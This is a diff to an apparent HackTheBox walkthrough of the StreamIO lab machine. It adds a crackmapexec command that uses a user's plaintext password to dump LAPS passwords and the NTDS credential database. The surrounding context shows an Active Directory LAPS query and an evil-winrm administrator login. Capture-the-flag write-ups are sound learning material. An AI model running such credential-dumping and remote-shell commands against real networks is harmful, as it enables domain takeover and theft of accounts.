@@ -309,6 +309,11 @@ Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
 ![image](https://user-images.githubusercontent.com/33616880/231689882-e7a2ef35-a3d0-4aa9-8f7f-2aa99b63203c.png)
 
 
+```
+crackmapexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/d03dba37-db5c-47d9-8038-a0f160fd34fa)
+
 
 evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5
 ![image](https://user-images.githubusercontent.com/33616880/231689974-20ed5dca-92b5-43ec-b985-0d56bcfacec8.png)
